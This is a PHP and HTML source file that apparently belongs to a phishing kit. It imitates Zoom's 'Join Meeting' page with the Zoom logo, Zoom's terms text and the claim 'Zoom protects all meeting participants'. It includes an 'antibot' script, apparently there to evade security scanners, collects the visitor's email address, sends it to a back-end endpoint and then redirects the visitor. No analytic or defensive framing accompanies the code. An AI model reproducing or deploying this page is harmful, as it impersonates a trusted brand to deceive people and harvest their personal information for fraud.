<?php
require_once __DIR__ . '/antibot.php';
antibot_protect();
require_once __DIR__ . '/config.php';
$m = preg_replace('/[^0-9\-]/', '', $_GET['m'] ?? '');
$meet = $m && file_exists(zm_meet_file($m)) ? zm_load(zm_meet_file($m)) : null;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Join Meeting – Zoom</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{background:#1c1c1e;min-height:100vh;display:flex;flex-direction:column;
  align-items:center;justify-content:center;font-family:"Segoe UI",Arial,sans-serif;color:#fff;padding:20px;}

.card{background:#2c2c2e;border-radius:16px;padding:40px 36px;width:100%;max-width:440px;
  box-shadow:0 24px 80px rgba(0,0,0,.5);}

.zm-logo{display:flex;align-items:center;gap:10px;margin-bottom:30px;}
.zm-icon{background:#2d8cff;width:40px;height:40px;border-radius:10px;
  display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:800;color:#fff;}
.zm-name{font-size:1.1rem;font-weight:700;}

h2{font-size:1.35rem;font-weight:700;margin-bottom:6px;}
.sub{color:#888;font-size:.85rem;margin-bottom:28px;}

.meet-badge{
  background:#1c1c1e;border:1px solid #444;border-radius:10px;
  padding:12px 16px;margin-bottom:24px;display:flex;align-items:center;gap:12px;
}
.meet-badge .icon{font-size:1.6rem;}
.meet-badge .info{flex:1;}
.meet-badge .id{font-size:1.1rem;font-weight:700;font-family:monospace;letter-spacing:.06em;}
.meet-badge .status{font-size:.75rem;color:#888;margin-top:2px;}

label{display:block;font-size:.8rem;color:#aaa;margin-bottom:6px;font-weight:600;}
input[type=email]{
  width:100%;background:#1c1c1e;border:1px solid #444;border-radius:10px;
  color:#fff;font-size:14px;padding:13px 16px;outline:none;margin-bottom:8px;
  transition:border-color .15s;
}
input[type=email]:focus{border-color:#2d8cff;}
input[type=email]::placeholder{color:#555;}
.hint{font-size:.72rem;color:#666;margin-bottom:20px;}

.join-btn{
  width:100%;background:#2d8cff;color:#fff;border:none;border-radius:10px;
  padding:14px;font-size:1rem;font-weight:700;cursor:pointer;
  display:flex;align-items:center;justify-content:center;gap:8px;
  transition:background .15s;
}
.join-btn:hover{background:#1a7ae8;}
.join-btn:disabled{background:#444;cursor:not-allowed;}

.error-box{background:#2d1111;border:1px solid #5c2020;border-radius:8px;
  padding:10px 14px;font-size:13px;color:#f88;margin-bottom:16px;display:none;}

.footer-note{margin-top:20px;font-size:.75rem;color:#555;text-align:center;line-height:1.6;}
</style>
</head>
<body>

<div class="card">
  <div class="zm-logo">
    <div class="zm-icon">Z</div>
    <span class="zm-name">Zoom</span>
  </div>

  <?php if (!$meet): ?>
    <h2>Meeting Not Found</h2>
    <p style="color:#888;font-size:.9rem;margin-top:8px;">
      This meeting link is invalid or has expired. Please ask the host for a new invite link.
    </p>
  <?php elseif ($meet['status'] === 'ended'): ?>
    <h2>Meeting Ended</h2>
    <p style="color:#888;font-size:.9rem;margin-top:8px;">This meeting has ended.</p>
  <?php else: ?>
    <h2>Join Meeting</h2>
    <p class="sub">Enter your email address to join this meeting</p>

    <div class="meet-badge">
      <div class="icon">📹</div>
      <div class="info">
        <div class="id"><?= htmlspecialchars($m) ?></div>
        <div class="status">
          <?= $meet['status'] === 'active' ? '🟢 In progress' : '🟡 Waiting for host' ?>
        </div>
      </div>
    </div>

    <div class="error-box" id="err"></div>

    <form id="joinForm">
      <label for="email">Your Email Address</label>
      <input type="email" id="email" name="email" placeholder="you@example.com" autofocus required>
      <div class="hint">Your email will be shared with the meeting host.</div>
      <button class="join-btn" type="submit" id="joinBtn">
        📹 Join Meeting
      </button>
    </form>

    <div class="footer-note">
      By joining, you agree to Zoom's Terms of Service and Privacy Policy.<br>
      Zoom protects all meeting participants.
    </div>
  <?php endif; ?>
</div>

<?php if ($meet && $meet['status'] !== 'ended'): ?>
<script>
document.getElementById('joinForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const btn   = document.getElementById('joinBtn');
  const errEl = document.getElementById('err');
  const email = document.getElementById('email').value.trim();

  btn.disabled = true;
  btn.textContent = 'Joining…';
  errEl.style.display = 'none';

  const fd = new FormData();
  fd.append('m', <?= json_encode($m) ?>);
  fd.append('email', email);

  try {
    const r = await fetch('api/join.php', {method:'POST', body:fd});
    const d = await r.json();
    if (d.ok) {
      btn.textContent = '✓ Redirecting to meeting room…';
      window.location.href = d.room;
    } else {
      errEl.textContent = d.msg || 'Failed to join meeting.';
      errEl.style.display = 'block';
      btn.disabled = false;
      btn.textContent = '📹 Join Meeting';
    }
  } catch (err) {
    errEl.textContent = 'Network error. Please try again.';
    errEl.style.display = 'block';
    btn.disabled = false;
    btn.textContent = '📹 Join Meeting';
  }
});
</script>
<?php endif; ?>
</body>
</html>
